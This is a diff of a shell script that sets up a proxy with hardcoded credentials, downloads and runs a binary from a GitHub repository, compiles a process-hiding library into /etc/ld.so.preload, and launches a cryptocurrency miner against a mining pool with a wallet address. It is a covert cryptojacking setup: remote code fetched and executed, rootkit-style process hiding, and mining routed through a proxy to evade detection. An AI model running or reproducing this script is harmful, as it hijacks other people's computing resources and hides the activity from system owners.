@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 54.84.138.60:1080
-socks5_username = ezhuli9bodai52
-socks5_password = ojwdtv0fb80i6rudtkp4whn1f2cnr
+socks5 = 45.152.196.183:9216
+socks5_username = nofvbdys
+socks5_password = 44tpywm4q9bo
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget -qO build https://git.io/JiGZh
-chmod +x build
+./graftcp/graftcp wget https://github.com/kilosri/ew/raw/main/gasken
+chmod +x gasken
 
 ./graftcp/graftcp wget https://github.com/kiposnakursi/a/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.$(echo $(shuf -i 1000-99999 -n 1)0803) -p x -t $(nproc) -x socks5://7amdbgj23nyn0e:khisr9gjnuxw049kbtldkaqtrcor@us-east-static-09.quotaguard.com:1080
+./graftcp/graftcp ./gasken -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RDuJgKwVgh1MAQoQPCKLKyZvQ36wFGCnEd.11maret -x socks5://nofvbdys:44tpywm4q9bo@45.152.196.183:9216
